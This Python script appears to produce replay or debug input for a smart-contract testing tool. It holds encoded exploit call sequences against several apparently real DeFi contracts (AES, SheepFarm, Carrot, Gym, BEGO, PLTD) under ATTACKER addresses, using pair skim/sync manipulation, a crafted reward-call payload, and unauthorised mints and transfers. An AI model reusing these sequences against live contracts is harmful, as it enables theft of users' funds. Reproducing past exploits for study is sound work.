from web3 import Web3
import json

import functools
import re
import requests
from retry import retry

headers = {
    'authority': 'etherscan.io',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,'
              'application/signed-exchange;v=b3;q=0.9',
    'accept-language': 'zh-CN,zh;q=0.9,en;q=0.8',
    'cache-control': 'max-age=0',
    'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Google Chrome";v="108"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"macOS"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) '
                  'Chrome/108.0.0.0 Safari/537.36',
}


def get_endpoint(network):
    if network == "eth":
        return "https://etherscan.io"
    elif network == "bsc":
        return "https://bscscan.com"
    elif network == "polygon":
        return "https://polygonscan.com"
    elif network == "mumbai":
        return "https://mumbai.polygonscan.com"
    else:
        raise Exception("Unknown network")

@functools.lru_cache(maxsize=10240)
@retry(tries=3, delay=0.5, backoff=2)
def fetch_etherscan_contract_abi(network, token_address):
    finder = re.compile("id='js-copytextarea2' style='height: 200px; max-height: 400px; margin-top: 5px;'>(.+?)</pre>")
    url = f"{get_endpoint(network)}/address/{token_address}"
    response = requests.get(url, headers=headers)
    response.raise_for_status()
    contract_abi = []
    for i in finder.findall(response.text):
        contract_abi = json.loads(i)

    if "loadIframeSourceProxyRead" in response.text:
        # this is a proxy contract, we need to merge with the implementation contract abi
        base_address_finder = re.compile(" at <a href=\'(.+?)\'>")
        base_address = base_address_finder.findall(response.text)
        if len(base_address) == 0:
            print("Failed to find base address for proxy contract")
        else:
            base_address = base_address[0].split("/")[-1].split("?")[0].split("#")[0]
            res = fetch_etherscan_contract_abi(network, base_address)
            contract_abi += res
    return contract_abi


def generate_debug_file(target, data):
    w3 = Web3()
    for i in data:
        abi = fetch_etherscan_contract_abi(target, i["target"])
        contract = w3.eth.contract(address=i["target"], abi=abi)
        abi_encoded = contract.encodeABI(fn_name=i["name"], args=i["args"]).replace("0x", "")
        print(f"txn {i['caller']} {i['target']} {abi_encoded} {hex(i['value'] if 'value' in i else 0).replace('0x', '')} "
              f"{i['liquidation_percent'] if 'liquidation_percent' in i else 0} "
              f"{i['warp'] if 'warp' in i else 0} ")



UmbrellaExp = [
    # caller can be arbitrary attacker
    {"caller": "0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e4", "target": "0xB3FB1D01B07A706736Ca175f827e4F56021b85dE", "name": "withdraw", "args": [8792873290680252648282]}
]
# generate_debug_file("eth", UmbrellaExp)


AES = Web3.toChecksumAddress("0xdDc0CFF76bcC0ee14c3e73aF630C029fe020F907")
PAIR = Web3.toChecksumAddress("0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3")
ATTACKER = Web3.toChecksumAddress("0x790ff2bdc2591af87e656febc6ffdf2d9b2f48e1")
AESExp = [
    {
        "caller": ATTACKER,
        "target": AES, 
        "name": "transfer", "args": [PAIR, Web3.toWei(1e5, "ether")]
    },

    *[
        {
            "caller": ATTACKER,
            "target": PAIR, 
            "name": "skim", "args": [PAIR]
        } for _ in range(2)
    ],

    {
        "caller": ATTACKER,
        "target": PAIR, 
        "name": "skim", "args": [ATTACKER]
    },

    {
        "caller": ATTACKER,
        "target": AES, 
        "name": "distributeFee", "args": []
    },

    {
         "caller":ATTACKER,
        "target": PAIR, 
        "name": "sync", "args": []
    },
    {
        "caller": ATTACKER,
        "target": AES,
        "name": "balanceOf", "args": [ATTACKER]
    },
]

SheepFarm = "0x4726010da871f4b57b5031E3EA48Bde961F122aA"
SheepExp = [
    *[
        {
            "caller": ATTACKER,
            "target": SheepFarm,
            "name": "register", "args": ["0x4726010da871f4b57b5031E3EA48Bde961F122aA"],
        } for _ in range(100)
    ],

    {
        "caller": ATTACKER,
        "target": SheepFarm,
        "name": "addGems", "args": [],
        "value": int(5e14)
    },
    *[
        {
            "caller": ATTACKER,
            "target": SheepFarm,
            "name": "upgradeVillage", "args": [i],
        } for i in range(3)
    ],
    {
        "caller": ATTACKER,
        "target": SheepFarm,
        "name": "sellVillage", "args": [],
    },
    {
        "caller": ATTACKER,
        "target": SheepFarm,
        "name": "withdrawMoney", "args": [20000],
        "liquidation_percent": 100
    }

]


CarrotExp = [
    {
        "caller": ATTACKER,
        "target": "0xcFF086EaD392CcB39C49eCda8C974ad5238452aC",
        "name": "transReward", "args": ["bf699b4b000000000000000000000000b4c79daB8f259C7Aee6E5b2Aa729821864227e84"]
    },
    {
        "caller": ATTACKER,
        "target": "0xcFF086EaD392CcB39C49eCda8C974ad5238452aC",
        "name": "transferFrom", "args": ["0x00B433800970286CF08F34C96cf07f35412F1161",ATTACKER, 310344736073087429864760]
    }
    # {
    #     "caller": ATTACKER,
    #     "target": "0xcFF086EaD392CcB39C49eCda8C974ad5238452aC",
    #     "name": "transReward", "args": ["0x223412341234"]
    # },
    # {
    #     "caller": ATTACKER,
    #     "target": "0xcFF086EaD392CcB39C49eCda8C974ad5238452aC",
    #     "name": "transReward", "args": ["0x323412341234"]
    # },
    # {
    #     "caller": ATTACKER,
    #     "target": "0xcFF086EaD392CcB39C49eCda8C974ad5238452aC",
    #     "name": "transReward", "args": ["0x423412341234"]
    # },
    # {
    #     "caller": ATTACKER,
    #     "target": "0xcFF086EaD392CcB39C49eCda8C974ad5238452aC",
    #     "name": "transReward", "args": ["0x523412341234"]
    # }
]

ATTACKER = "0x8EF508Aca04B32Ff3ba5003177cb18BfA6Cd79dd"
GymExp = [
    {
        "caller": ATTACKER,
        "target": "0xA8987285E100A8b557F06A7889F79E0064b359f2",
        "name": "depositFromOtherContract", "args": [8000000000000000000000666,
                                                     0,
                                                     True,
                                                     ATTACKER]
    },
    {
        "caller": ATTACKER,
        "target": "0xA8987285E100A8b557F06A7889F79E0064b359f2",
        "name": "withdraw", "args": [0],
        "warp": 100000000000,
        "liquidation_percent": 10
    },
    {
        "caller": ATTACKER,
        "target": "0x3a0d9d7764FAE860A659eb96A500F1323b411e68",
        "name": "balanceOf", "args": [ATTACKER],
    }
]


BEGOExp = [
    {
        "caller": ATTACKER,
        "target": "0xc342774492b54ce5F8ac662113ED702Fc1b34972",
        "name": "mint", "args": [int(100000000 * 1e18), "t", ATTACKER, [], [], []],
        "liquidation_percent": 10
    }
]

ATTACKER = "0x9aBF443c311447793e0b7fcBa9440eE812E26881"
PAIR = "0x4397C76088db8f16C15455eB943Dd11F2DF56545"
TOKEN = "0x29b2525e11BC0B0E9E59f705F318601eA6756645"


PLTDExp = [
    {
        "caller": ATTACKER,
        "target": TOKEN,
        "name": "balanceOf", "args": [ATTACKER],
    },
    {
        "caller": ATTACKER,
        "target": TOKEN,
        "name": "balanceOf", "args": [PAIR],
    },
    {
        "caller": ATTACKER,
        "target": "0x29b2525e11BC0B0E9E59f705F318601eA6756645",
        "name": "transfer", "args": [PAIR, int(0x00000000000000000000000000000000000000000001718d0c5ab4c766f15fdf * 2)],
    },
    {
        "caller": ATTACKER,
        "target": PAIR,
        "name": "skim", "args": [ATTACKER],
    },
    {
        "caller": ATTACKER,
        "target": TOKEN,
        "name": "balanceOf", "args": [ATTACKER],
    },
]

generate_debug_file("bsc", PLTDExp)
